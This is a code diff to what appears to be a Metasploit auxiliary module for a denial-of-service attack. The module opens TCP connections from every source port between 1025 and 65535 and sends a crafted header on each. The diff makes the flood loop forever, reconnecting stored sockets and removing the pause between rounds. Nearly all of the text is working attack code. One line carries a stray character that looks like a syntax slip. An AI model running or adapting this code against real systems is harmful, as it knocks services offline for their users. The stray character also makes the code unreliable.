@@ -29,7 +29,8 @@ class MetasploitModule < Msf::Auxiliary
         and Zach Harding.
 
         DISCALIMER: This module opens a lot of simultaneous connections. Please check
-        your system's ULIMIT to make sure it can handle it.
+        your system's ULIMIT to make sure it can handle it. This module will also run
+        continuously until stopped.
       },
       'Author'          =>
         [
@@ -55,27 +56,33 @@ class MetasploitModule < Msf::Auxiliary
 
     linger = Socket::Option.linger(true, 60)
 
+    while true do
+      sockets = {}
+      (1025..65535).each do |src_port|
+        print_status "Sending packet from Source Port: #{src_port}"
+        opts = {
+          'CPORT'           => src_port,
+          'ConnectTimeout'  => 360
+        }
 
-    (1025..65535).each do |src_port|
-      print_status "Sending packet from Source Port: #{src_port}"
-      opts = {
-        'CPORT'           => src_port,
-        'ConnectTimeout'  => 360
-      }
+        if sockets[src_port]
+          disconnect(sockets[src_port])
+        end
 
-      begin
-        nsock = connect(false, opts)
-        nsock.setsockopt(Socket::SOL_SOCKET, Socket::SO_KEEPALIVE, true)
-        nsock.setsockopt(Socket::Option.int(:INET, :TCP, :KEEPCNT, 5))
-        nsock.setsockopt(Socket::Option.int(:INET, :TCP, :KEEPINTVL, 10))
-        nsock.setsockopt(linger)
-        nsock.write(header.to_binary_s)
-      rescue ::Exception => e
-        print_error "Exception sending packet: #{e.message}"
+        begin
+          nsock = connect(false, opts)
+          nsock.setsockopt(Socket::SOL_SOCKET, Socket::SO_KEEPALIVE, true)
+          nsock.setsockopt(Socket::Option.int(:INET, :TCP, :KEEPCNT, 5))
+          nsock.setsockopt(Socket::Option.int(:INET, :TCP, :KEEPINTVL, 10))
+          nsock.setsockopt(linger)
+          nsock.write(header.to_binary_s)
+          sockets[src_port] = nsock       g
+        rescue ::Exception => e
+          print_error "Exception sending packet: #{e.message}"
+        end
       end
     end
-    print_status "Sleeping for 30 seconds..."
-    select(nil, nil, nil, 30)
+
 
   end
 
